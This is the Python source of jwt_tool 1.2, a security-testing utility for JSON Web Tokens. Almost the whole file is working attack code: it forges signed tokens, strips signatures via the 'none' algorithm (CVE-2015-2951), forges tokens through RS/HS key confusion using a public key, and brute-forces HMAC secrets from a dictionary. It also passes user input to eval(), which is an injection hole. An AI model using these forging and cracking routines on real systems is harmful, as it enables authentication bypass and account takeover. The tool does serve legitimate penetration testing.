#!/usr/bin/env python3
#
# JWT_Tool version 1.2 (17_10_2019)
# Written by ticarpi
# Please use responsibly...
# Software URL: https://github.com/ticarpi/jwt_tool
# Web: https://www.ticarpi.com
# Twitter: @ticarpi
#

import sys
import hashlib
import hmac
import base64
import json
from collections import OrderedDict

def usage():
    print("Usage: $ python3 jwt_tool.py <JWT> (filename for dictionary or key file)\n")
    print("If you don't have a token, try this one:")
    print("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po")
    exit(1)

def checkSig(sig, contents):
    quiet = False
    print("Type in the key to test")
    key = input("> ").encode()
    testKey(key, sig, contents, headDict, quiet)

def checkSigKid(sig, contents):
    quiet = False
    print("\nLoading key file...")
    key1 = open(keyList).read()
    print("File loaded: "+keyList)
    testKey(key1.encode(), sig, contents, headDict, quiet)

def crackSig(sig, contents):
    quiet = True
    print("\nLoading key dictionary...")
    print("File loaded: "+keyList)
    for i in keyLst:
        testKey(i, sig, contents, headDict, quiet)
    print("\n[-] Key not found")

def testKey(key, sig, contents, headDict, quiet):
    if headDict["alg"] == "HS256":
        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha256).digest()).decode('UTF-8').strip("=")
    elif headDict["alg"] == "HS384":
        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha384).digest()).decode('UTF-8').strip("=")
    elif headDict["alg"] == "HS512":
        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha512).digest()).decode('UTF-8').strip("=")
    else:
        print("Algorithm is not HMAC-SHA - cannot test with this tool.")
        exit(1)
    if testSig == sig:
        if len(key) > 25:
            print("\n[+] "+key[0:25].decode('UTF-8')+"...(output trimmed) is the CORRECT key!")
        else:
            print("\n[+] "+key.decode('UTF-8')+" is the CORRECT key!")
        exit(1)
    else:
        if quiet == False:
            if len(key) > 25:
                print("[-] "+key[0:25].decode('UTF-8')+"...(output trimmed) is not the correct key")
            else:
                print("[-] "+key.decode('UTF-8')+" is not the correct key")
        return

def buildHead(alg, headDict):
    newHead = headDict
    newHead["alg"] = alg
    newHead = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newHead

def signToken(headDict, paylDict, key, keyLength):
    newHead = headDict
    newHead["alg"] = "HS"+str(keyLength)
    if keyLength == 384:
        newContents = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha384).digest()).decode('UTF-8').strip("=")
        badSig = base64.b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha384).digest()).decode('UTF-8').strip("=")
    elif keyLength == 512:
        newContents = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha512).digest()).decode('UTF-8').strip("=")
        badSig = base64.b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha512).digest()).decode('UTF-8').strip("=")
    else:
        newContents = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
        badSig = base64.b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
    return newSig, badSig, newContents

def checkAlgNone(headDict, tok2):
    print("\n====================================================================\nThis option attempts to use the \"none\" algorithm option in some \nimplementations of JWT so that the signature is stripped entirely \nand the token can be freely tampered with. \nIf successful you can use the Tamper options to forge whatever token \ncontent you like!\n====================================================================")
    print("\nGenerating alg-stripped tokens...")
    alg = "None"
    newHead = buildHead(alg, headDict)
    CVEToken = newHead+"."+tok2+"."
    alg1 = "none"
    newHead1 = buildHead(alg1, headDict)
    CVEToken1 = newHead1+"."+tok2+"."
    print("\nSet one of these new tokens as the AUTH cookie, or session/local \nstorage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)\n")
    print("\"alg\": \"None\":\n"+CVEToken+"")
    print("\"alg\": \"none\":\n"+CVEToken1+"\n")

def checkPubKey(headDict, tok2):
    print("\n====================================================================\nThis option takes an available Public Key (the SSL certificate from \na webserver, for example?) and switches the RSA-signed \n(RS256/RS384/RS512) JWT that uses the Public Key as its 'secret'.\n====================================================================")
    print("\nPlease enter the Public Key filename:")
    pubKey = input("> ")
    try:
        key = open(pubKey).read()
        newHead = headDict
        newHead["alg"] = "HS256"
        newHead = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        newTok = newHead+"."+tok2
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newTok.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
        print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
        print("\n"+newTok+"."+newSig)
    except:
        print("[-] File not valid")

def tamperToken(paylDict, headDict):
    print("\nToken header values:")
    while True:
        i = 0
        headList = [0]
        for pair in headDict:
            menuNum = i+1
            print("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]))
            headList.append(pair)
            i += 1
        print("["+str(i+1)+"] *ADD A VALUE*")
        print("["+str(i+2)+"] *DELETE A VALUE*")
        print("[0] Continue to next step")
        selection = ""
        print("\nPlease select a field number:\n(or 0 to Continue)")
        try:
            selection = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if selection<len(headList) and selection>0:
            print("\nCurrent value of "+headList[selection]+" is: "+str(headDict[headList[selection]]))
            print("Please enter new value and hit ENTER")
            newVal = input("> ")
            headDict[headList[selection]] = newVal
        elif selection == i+1:
            print("Please enter new Key and hit ENTER")
            newPair = input("> ")
            print("Please enter new value for "+newPair+" and hit ENTER")
            newVal = input("> ")
            headList.append(newPair)
            headDict[headList[selection]] = newVal
        elif selection == i+2:
            print("Please select a Key to DELETE and hit ENTER")
            i = 0
            for pair in headDict:
                menuNum = i+1
                print("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]))
                headList.append(pair)
                i += 1
            delPair = eval(input("> "))
            del headDict[headList[delPair]]
        elif selection == 0:
            break
        else:
            exit(1)
    print("\nToken payload values:")
    while True:
        i = 0
        paylList = [0]
        for pair in paylDict:
            menuNum = i+1
            print("["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair]))
            paylList.append(pair)
            i += 1
        print("["+str(i+1)+"] *ADD A VALUE*")
        print("["+str(i+2)+"] *DELETE A VALUE*")
        print("[0] Continue to next step")
        selection = ""
        print("\nPlease select a field number:\n(or 0 to Continue)")
        try:
            selection = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if selection<len(paylList) and selection>0:
            print("\nCurrent value of "+paylList[selection]+" is: "+str(paylDict[paylList[selection]]))
            print("Please enter new value and hit ENTER")
            newVal = input("> ")
            paylDict[paylList[selection]] = newVal
        elif selection == i+1:
            print("Please enter new Key and hit ENTER")
            newPair = input("> ")
            print("Please enter new value for "+newPair+" and hit ENTER")
            newVal = input("> ")
            paylList.append(newPair)
            paylDict[paylList[selection]] = newVal
        elif selection == i+2:
            print("Please select a Key to DELETE and hit ENTER")
            i = 0
            for pair in paylDict:
                menuNum = i+1
                print("["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair]))
                paylList.append(pair)
                i += 1
            delPair = eval(input("> "))
            del paylDict[paylList[delPair]]
        elif selection == 0:
            break
        else:
            exit(1)
    print("\nToken Signing:")
    print("[1] Sign token with known key")
    print("[2] Strip signature from token vulnerable to CVE-2015-2951")
    print("[3] Sign with Public Key bypass vulnerability")
    print("[4] Sign token with key file")
    print("\nPlease select an option from above (1-4):")
    try:
        selection = int(input("> "))
    except:
        print("Invalid selection")
        exit(1)
    if selection == 1:
        print("\nPlease enter the known key:")
        key = input("> ")
        print("\nPlease enter the keylength:")
        print("[1] HMAC-SHA256")
        print("[2] HMAC-SHA384")
        print("[3] HMAC-SHA512")
        try:
            selLength = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if selLength == 1:
            keyLength = 256
        elif selLength == 2:
            keyLength = 384
        elif selLength == 3:
            keyLength = 512
        else:
            print("Invalid selection")
            exit(1)
        newSig, badSig, newContents = signToken(headDict, paylDict, key, keyLength)
        print("\nYour new forged token:")
        print("[+] URL safe: "+newContents+"."+newSig)
        print("[+] Standard: "+newContents+"."+badSig+"\n")
        exit(1)
    elif selection == 2:
        print("\nStripped Signature")
        tok2 = base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        checkAlgNone(headDict, tok2)
        exit(1)
    elif selection == 3:
        tok2 = base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        checkPubKey(headDict, tok2)
        exit(1)
    if selection == 4:
        print("\nPlease enter the key file's filename:")
        keyList = input("> ")
        print("\nLoading key file...")
        key1 = open(keyList).read()
        print("File loaded: "+keyList)
        print("\nPlease enter the keylength:")
        print("[1] HMAC-SHA256")
        print("[2] HMAC-SHA384")
        print("[3] HMAC-SHA512")
        try:
            selLength = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if selLength == 1:
            keyLength = 256
        elif selLength == 2:
            keyLength = 384
        elif selLength == 3:
            keyLength = 512
        else:
            print("Invalid selection")
            exit(1)
        newSig, badSig, newContents = signToken(headDict, paylDict, key1, keyLength)
        print("\nYour new forged token:")
        print("[+] URL safe: "+newContents+"."+newSig)
        print("[+] Standard: "+newContents+"."+badSig+"\n")
        exit(1)
    else:
        exit(1)

if __name__ == '__main__':
# Print logo
    print()
    print("   $$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$$$\                  $$\ ")
    print("   \__$$ |$$ | $\  $$ |\__$$  __| \__$$  __|                 $$ |")
    print("      $$ |$$ |$$$\ $$ |   $$ |       $$ | $$$$$$\   $$$$$$\  $$ |")
    print("      $$ |$$ $$ $$\$$ |   $$ |       $$ |$$  __$$\ $$  __$$\ $$ |")
    print("$$\   $$ |$$$$  _$$$$ |   $$ |       $$ |$$ /  $$ |$$ /  $$ |$$ |")
    print("$$ |  $$ |$$$  / \$$$ |   $$ |       $$ |$$ |  $$ |$$ |  $$ |$$ |")
    print("\$$$$$$  |$$  /   \$$ |   $$ |       $$ |\$$$$$$  |\$$$$$$  |$$ |")
    print(" \______/ \__/     \__|   \__|$$$$$$\\__| \______/  \______/ \__|")
    print(" Version 1.2.1                \______|                           ")
    print()

# Print usage + check token validity
    if len(sys.argv) < 2:
        usage()

# Temporary variables
    jwt = sys.argv[1]
    key = ""
    if len(sys.argv) == 3:
        keyList = sys.argv[2]
        with open(keyList, "rb") as f:
            keyLst = f.readlines()
        keyLst = [x.strip() for x in keyLst]
    else:
        keyList = ""

# Rejig token
    try:
        tok1, tok2, sig = jwt.split(".",3)
        sig = base64.urlsafe_b64encode(base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))).decode('UTF-8').strip("=")
        contents = tok1+"."+tok2
        contents = contents.encode()
        head = base64.b64decode(tok1 + "=" * (-len(tok1) % 4))
        payl = base64.b64decode(tok2 + "=" * (-len(tok2) % 4))
        headDict = json.loads(head, object_pairs_hook=OrderedDict)
        paylDict = json.loads(payl, object_pairs_hook=OrderedDict)
    except:
        print("Oh noes! Invalid token")
        exit(1)

# Main menu
    print("\n=====================\nDecoded Token Values:\n=====================")
    print("\nToken header values:")
    for i in headDict:
          print("[+] "+i+" = "+str(headDict[i]))
    print("\nToken payload values:")
    for i in paylDict:
          print("[+] "+i+" = "+str(paylDict[i]))
    print("\n\n########################################################")
    print("#  Options:                                            #")
    print("#                ==== TAMPERING ====                   #")
    print("#  1: Tamper with JWT data (multiple signing options)  #")
    print("#                                                      #")
    print("#             ==== VULNERABILITIES ====                #")
    print("#  2: Check for the \"none\" algorithm vulnerability     #")
    print("#  3: Check for HS/RSA key confusion vulnerability     #")
    print("#                                                      #")
    print("#            ==== CRACKING/GUESSING ====               #")
    print("#  4: Check signature against a key (password)         #")
    print("#  5: Check signature against a Private Key file       #")
    print("#  6: Crack signature with supplied dictionary file    #")
    print("#                                                      #")
    print("#  0: Quit                                             #")
    print("########################################################")
    print("\nPlease make a selection (1-6)")
    try:
        selection = int(input("> "))
    except:
        print("Invalid selection")
        exit(1)
    if selection == 1:
        tamperToken(paylDict, headDict)
    elif selection == 2:
        checkAlgNone(headDict, tok2)
    elif selection == 3:
        checkPubKey(headDict, tok2)
    elif selection == 4:
        checkSig(sig, contents)
    elif selection == 5:
        if keyList != "":
            checkSigKid(sig, contents)
        else:
            print("No key file provided.\n")
            usage()
    elif selection == 6:
        if keyList != "":
            crackSig(sig, contents)
        else:
            print("No dictionary file provided.\n")
            usage()
    else:
        exit(1)
    exit(1)
